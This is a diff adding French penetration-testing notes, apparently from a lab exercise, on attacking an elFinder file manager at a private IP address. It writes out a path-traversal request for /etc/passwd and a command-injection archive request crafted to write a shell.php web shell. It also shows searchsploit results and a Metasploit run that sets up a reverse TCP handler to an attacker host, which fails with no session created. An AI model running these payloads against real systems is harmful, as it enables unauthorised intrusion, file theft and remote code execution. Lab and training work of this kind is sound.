@@ -93,3 +93,67 @@ J'ai trouvé un autre POC qui modifie en test.php..
 puis a<?php phpinfo();?>
 Mais ça m'affiche tjr en text
 Réponse 200 OK
+
+
+le target id de mon fichier test.php8 est l1_dGVzdC5waHA4
+On va tester http://192.168.53.243/php/connector.minimal.php?cmd=file&target=l1_dGVzdC5waHA4
+http://192.168.53.243/files/test.php8?_t=1774277490
+tjr même text
+On test avec cmd=open, on tombe sur le json, folder not found
+
+LFI ??
+https://www.synacktiv.com/publications/elfinder-the-story-of-a-repwning
+GET /php/connector.minimal.php?cmd=file&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@base64>&download=1 HTTP/1.1
+
+On réajuste avec notre requete, ça donne
+GET /php/connector.minimal.php?cmd=ls&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@base64>&intersect%5B%5D=screen.jpg&reqid=19d1b4bf89114a HTTP/1.1
+"errOpen" mais accepté en reponse 200
+
+le fait que la page soit en #elf_l1_Lw signifie que la LFI est dans le connector.minimal.php
+http://192.168.53.243/php/connector.minimal.php?cmd=file&target=l1_dGVzdC5waHA4&download=1 ça download bien
+
+On va tester le .zip
+créer un fichier 1.txt (target=l1_MS50eHQ) puis archive en 2.zip (target=l1_Mi56aXA)
+GET /php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php%20%23%20a.zip&target=l1_Lw&targers%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip HTTP/1.1
+name, its value is equal to -TvTT=id>shell.php # a.zip, you can modify the id>shell.php to arbitrary commands
+targets[0], its value is equal to l1_MS50eHQ. l1 means the first storage volume, MS50eHQ is the base64 encoded string of 1.txt
+targets[1], its value is equal to l1_Mi56aXA. l1 means the first storage volume, Mi56aXA is the base64 encoded string of 2.zip
+
+Bien que cette réponse ait une erreur errArchive, si j'execute https://192.168.53.243/:8080/files/shell.php ça devrait fonctionner -> non
+
+On recreuse https://0xss0rz.gitbook.io/0xss0rz/pentest/public-exploit/elfinder
+
+aide : https://www.youtube.com/watch?v=a2_uO8yj6qk
+
+sur ma kali 
+searchsploit "elfinder"
+elFinder 2 - Remote Command Execution (via File Creation)               | php/webapps/36925.py
+elFinder 2.1.47 - 'PHP connector' Command Injection                     | php/webapps/46481.py
+elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metaspl | php/remote/46539.rb
+elFinder Web file manager Version - 2.1.53 Remote Command Execution     | php/webapps/51864.txt
+
+msfconsole
+> search elfinder
+0  exploit/multi/http/builderengine_upload_exec                       2016-09-18       excellent  Yes    BuilderEngine Arbitrary File Upload Vulnerability and execution
+   1  exploit/unix/webapp/tikiwiki_upload_exec                           2016-07-11       excellent  Yes    Tiki Wiki Unauthenticated File Upload Vulnerability
+   2  exploit/multi/http/wp_file_manager_rce                             2020-09-09       normal     Yes    WordPress File Manager Unauthenticated Remote Code Execution
+   3  exploit/linux/http/elfinder_archive_cmd_injection                  2021-06-13       excellent  Yes    elFinder Archive Command Injection
+   4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection
+
+> use 3
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set RHOSTS 192.168.53.243
+msf exploit(linux/http/elfinder_archive_cmd_injection) > set -g LHOST eth0
+msf exploit(linux/http/elfinder_archive_cmd_injection) > exploit
+[*] Started reverse TCP handler on 192.168.49.53:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. elFinder running version 2.1.58
+[*] Uploading file kOuxk.txt to elFinder
+[+] Text file was successfully uploaded!
+[*] Attempting to create archive LjciSHnRQU.zip
+[+] Archive was successfully created!
+[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:8080).
+[!] This exploit may require manual cleanup of 'kOuxk.txt' on the target
+[!] This exploit may require manual cleanup of 'LjciSHnRQU.zip' on the target
+[*] Exploit completed, but no session was created.
+
+
